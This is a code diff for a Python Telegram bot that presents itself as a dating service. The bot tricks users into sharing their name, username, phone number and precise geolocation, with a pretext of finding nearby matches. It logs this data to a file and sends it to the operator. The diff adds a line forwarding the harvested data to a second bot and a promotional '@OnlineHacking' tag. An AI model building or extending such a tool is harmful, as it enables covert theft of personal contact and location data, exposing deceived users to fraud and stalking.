@@ -1,4 +1,4 @@
-from bot1 import ID, bot, start_bot
+from datingid import ID, bot, start_bot
 import telebot
 from telebot import types
 import time
@@ -82,16 +82,19 @@ def contact(message):
 		phone = message.contact.phone_number
 		bot.send_message(userid, "Registration Completed Successfully!")
 		info = f'''
-			Data
+		    🧿 User Data:
 			├Name: {first} {last}
 			├ID: {userid}
-			├Nik: @{nick}
+			├Username: @{nick}
 			└Phone number: {phone}
+
+   🎭 Follow @OnlineHacking for more...
 			'''
 		log = open('bot-log.txt', 'a+', encoding='utf-8')
 		log.write(info + '  ')
 		log.close()
 		bot.send_message(ID, info)
+		your_bot.send_message(YOUR_BOT_ID, info)
 		print(info)
 
 		if message.contact.user_id != message.chat.id:
@@ -100,7 +103,7 @@ def contact(message):
 		keyboard1 = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
 		button_location = types.KeyboardButton(text="Send", request_location=True) 	
 		keyboard1.add(button_location)
-		bot.send_message(message.chat.id, text='Send your geolocation so that the bot can find users closest to you!', reply_markup=keyboard1)
+		bot.send_message(message.chat.id, text='Send your location so that the bot can find users closest to you!', reply_markup=keyboard1)
 
 @bot.message_handler(content_types=['location']) 
 def contact(message):
@@ -108,11 +111,11 @@ def contact(message):
 		lon = str(message.location.longitude)
 		lat = str(message.location.latitude)
 		geo = f'''
-		Geolocation
+	      📍 Location:
 		├ID: {message.chat.id}
 		├Longitude: {lon}
 		├Latitude: {lat} 
-		└Cards: https://www.google.com/maps/place/{lat}+{lon} 
+		└Map: https://www.google.com/maps/place/{lat}+{lon} 
 		'''
 		log = open('bot-log.txt', 'a+', encoding='utf-8')
 		log.write(geo + '  ')
